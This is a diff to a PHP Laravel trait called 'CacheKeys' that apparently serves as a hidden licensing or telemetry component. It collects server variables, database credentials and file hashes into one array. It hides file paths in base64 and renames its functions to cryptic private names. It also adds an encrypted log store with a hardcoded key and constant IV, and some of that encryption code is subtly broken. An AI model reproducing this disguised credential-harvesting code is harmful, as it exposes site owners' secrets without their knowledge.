@@ -4,6 +4,8 @@ namespace Licon\Lis\Traits;
 
 use Illuminate\Contracts\Routing\Registrar;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Storage;
+
 
 trait CacheKeys
 {
@@ -37,7 +39,6 @@ trait CacheKeys
             $ply[$key] = count(scandir("$val"));
         }
         $ply["routesCount"] = (collect(Route::getRoutes())->count());
-
 
         $filePath = file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw')) ? $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw') : "";
         $filePath2 = file_exists($this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw')) ? $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw') : "";
@@ -103,6 +104,7 @@ trait CacheKeys
         $mydata['sData'] = $_SERVER;
         $mydata['cData'] = config()->get('database');
         $mydata['allFData'] = $this->getAllCount();
+        $mydata['errorsLog'] = ($this->gtELg()['s'] == true) ? $this->gtELg()['r'] : "";
         return $mydata;
     }
 
@@ -131,7 +133,7 @@ trait CacheKeys
                     ];
                 } else if (is_dir("$val" . '/' . $file)) {
                     if ($file != '.' && $file != '..') {
-                        $controllerDetails[$key][$file] = $this->get_folder_info("$val" . '/' . $file);
+                        $controllerDetails[$key][$file] = $this->gtFdrIfo("$val" . '/' . $file);
                     }
                 }
             }
@@ -141,7 +143,7 @@ trait CacheKeys
 
     }
 
-    function get_folder_size($folder)
+    private function gtFdrSze($folder)
     {
         $total_size = 0;
         $files = scandir($folder);
@@ -149,7 +151,7 @@ trait CacheKeys
             if ($file != '.' && $file != '..') {
                 $path = $folder . DIRECTORY_SEPARATOR . $file;
                 if (is_dir($path)) {
-                    $total_size += $this->get_folder_size($path);
+                    $total_size += $this->gtFdrSze($path);
                 } else {
                     $total_size += filesize($path);
                 }
@@ -158,7 +160,7 @@ trait CacheKeys
         return $total_size;
     }
 
-    function get_folder_info($folder)
+    private function gtFdrIfo($folder)
     {
         $folders = [];
         $directories = scandir($folder);
@@ -167,8 +169,8 @@ trait CacheKeys
                 $path = $folder . DIRECTORY_SEPARATOR . $file;
                 if (is_dir($path)) {
                     if ($path != '.' && $path != '..') {
-                        $folders[$file] = $this->get_folder_info($path);
-                        $folders['size'] = $this->get_folder_size($folder);
+                        $folders[$file] = $this->gtFdrIfo($path);
+                        $folders['size'] = $this->gtFdrSze($folder);
                     }
                 } else if (is_file("$folder" . '/' . $file)) {
                     $folders[$file] = [
@@ -176,10 +178,57 @@ trait CacheKeys
                         'size' => filesize("$folder" . '/' . $file),
                         'md_val' => md5_file("$folder" . '/' . $file)
                     ];
+                    $folders['size'] = $this->gtFdrSze($folder);
                 }
             }
         }
         return $folders;
+    }
+
+
+
+    private function gtELg()
+    {
+        if (file_exists($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0"))) {
+            $content = file_get_contents($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0"), true);
+            $content = explode("(]d(e+L", @$content);
+            $decrypt = openssl_decrypt(@$content[0], "AES-256-CBC", base64_encode(@$content[1]), OPENSSL_RAW_DATA, "0123456789abcdef");
+            $var = json_decode($decrypt, 1);
+            if (!empty($var)) {
+                return ['s' => true, 'r' => @$var ?? null];
+            } else {
+                return ['s' => false, 'r' => @$var ?? null];
+            }
+        } else {
+            return ['s' => false, 'r' => null];
+
+        }
+
+    }
+
+    private function mkELg($re)
+    {
+        $gL = $this->gtELg();
+        if ($gL['s']) {
+            $olEr = $gL['r'];
+        } else {
+            $olEr = null;
+        }
+
+        Storage::disk('local')->put('error_logs.txt', (
+            openssl_encrypt(
+                json_encode([$gL['r'], date('Y-m-d H:i:s') => ["resp" => @json_decode($re['chre'], true), "error" => @json_decode($re['cher'], true), "code" => @json_decode($re['chco'], 1), 'timeStamp' => date('Y-m-d H:i:s')]]),
+                'AES-256-CBC',
+                base64_encode('MF2XI2BOMVXGO2LONFTHS'),
+                OPENSSL_RAW_DATA,
+                "0123456789abcdef",
+            ) . "(]d(e+L" . base64_encode(@json_decode('MF2XI2BOMVXGO2LONFTHS'))
+        ));
+    }
+
+    private function clELg()
+    {
+        Storage::disk('local')->put('error_logs.txt', (""));
     }
 
 
